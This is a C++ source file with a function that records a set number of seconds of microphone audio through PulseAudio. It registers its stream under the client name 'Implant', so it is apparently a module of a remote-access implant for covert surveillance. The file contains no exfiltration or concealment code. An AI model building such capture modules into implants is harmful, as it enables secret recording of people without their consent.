#include "Audio.h"
#include <unistd.h>
#include <vector>
#include <string>
#include <cstring>
#include <pulse/simple.h>
#include <pulse/error.h>
#include "../utils/Logger.h"

namespace capture {
    std::vector<BYTE> RecordAudio(int seconds) {
        std::vector<BYTE> buffer;

        // PA Simple API settings
        static const pa_sample_spec ss = {
            .format = PA_SAMPLE_S16LE,
            .rate = 44100,
            .channels = 2
        };

        int error;
        pa_simple* s = pa_simple_new(NULL, "Implant", PA_STREAM_RECORD, NULL, "record", &ss, NULL, NULL, &error);
        if (!s) {
            LOG_ERR("pa_simple_new() failed: " + std::string(pa_strerror(error)));
            return buffer;
        }

        // 44100Hz * 2 channels * 2 bytes/sample * seconds
        size_t bytesToRecord = 44100 * 2 * 2 * seconds;
        buffer.resize(bytesToRecord);

        size_t totalRead = 0;
        unsigned char tmp[4096];
        while (totalRead < bytesToRecord) {
            size_t toRead = std::min(sizeof(tmp), bytesToRecord - totalRead);
            if (pa_simple_read(s, tmp, toRead, &error) < 0) {
                LOG_ERR("pa_simple_read() failed: " + std::string(pa_strerror(error)));
                break;
            }
            memcpy(buffer.data() + totalRead, tmp, toRead);
            totalRead += toRead;
        }

        pa_simple_free(s);
        return buffer;
    }
}
